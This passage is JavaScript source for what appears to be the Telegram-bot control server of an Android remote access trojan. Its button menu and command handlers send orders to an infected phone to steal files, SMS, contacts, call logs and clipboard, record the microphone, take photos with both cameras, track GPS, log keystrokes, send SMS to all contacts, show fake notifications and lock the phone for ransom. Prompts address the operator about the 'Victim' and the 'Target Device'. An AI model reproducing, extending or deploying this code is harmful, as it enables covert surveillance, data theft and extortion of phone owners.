                        {text: '🍫𝐆𝐄𝐓 𝐅𝐢𝐋𝐄🍫', callback_data: `file:${uuid}`},
                        {text: '🏆𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄🏆', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '🧨𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍🧨', callback_data: `screenshot:${uuid}`},
                        {text: '☎️𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆☎️', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: '⛄𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃⛄', callback_data: `clipboard:${uuid}`},
                        {text: '🥤𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃🥤', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📸𝐁𝐀𝐂𝐊 𝐂𝐀𝐌𝐄𝐑𝐀📷', callback_data: `camera_main:${uuid}`},
                        {text: '🚸𝐅𝐑𝐎𝐍𝐓 𝐂𝐀𝐌𝐄𝐑𝐀🚸', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📟𝐋𝐢𝐕𝐄 𝐆𝐏𝐒📟', callback_data: `location:${uuid}`},
                        {text: '🖥️𝐄𝐂𝐇𝐎 𝐒𝐌𝐒🖥️', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: '🥃𝐂𝐎𝐎𝐊𝐈𝐄🥃', callback_data: `Settings:${uuid}`},
                        {text: '🍁𝐆𝐌𝐀𝐈𝐋 𝐇𝐀𝐂𝐊🍁', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '🎻𝐂𝐀𝐋𝐋 𝐇𝐢𝐒𝐓𝐎𝐑𝐘🎻', callback_data: `calls:${uuid}`},
                        {text: '♐𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐋𝐢𝐒𝐓♐', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '🚳𝐕𝐢𝐁𝐑𝐀𝐓𝐄🚳', callback_data: `vibrate:${uuid}`},
                        {text: '🏖️𝐍𝐎𝐓𝐢-𝐅𝐢𝐂𝐀𝐓𝐢𝐎𝐍🏖️', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '📺𝐒𝐌𝐒 𝐋𝐢𝐒𝐓📺', callback_data: `messages:${uuid}`},
                        {text: '🛍️𝐒𝐌𝐒 𝐒𝐄𝐍𝐃🛍️', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🌋𝐏𝐑𝐢𝐕𝐀𝐓𝐄 𝐏𝐢𝐜🌋', callback_data: `Ransomware:${uuid}`},
                        {text: '🛰️𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐀𝐏𝐏🛰️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🌀𝐒𝐓𝐀𝐑𝐓 𝐒𝐎𝐔𝐍𝐃🌀', callback_data: `play_audio:${uuid}`},
                        {text: '🎹𝐒𝐓𝐎𝐏 𝐒𝐎𝐔𝐍𝐃🎹', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '🚦𝐒𝐄𝐍𝐃 𝐒𝐌𝐒 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐀𝐓🚦',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: '🏟️𝐏𝐇𝐎𝐍𝐄 𝐋𝐎𝐂𝐊🏟️', callback_data: `encrypt_data:${uuid}`},
                        {text: '🏛️𝐔𝐍𝐋𝐎𝐂𝐊 𝐏𝐇𝐎𝐍𝐄🏛️', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: '🛒𝐂𝐓𝐑𝐋 𝐒𝐂𝐑𝐄𝐄𝐍🛒', callback_data: `keylogger_on:${uuid}`},
                        {text: '🪆𝐏𝐀𝐒𝐒 𝐇𝐢𝐉𝐀𝐂𝐊🪆', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• \n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🎧𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐃𝐢𝐫𝐞𝐜𝐭 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐏𝐥𝐚𝐲 𝐀𝐧𝐲 𝐒𝐨𝐮𝐧𝐝🎬\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
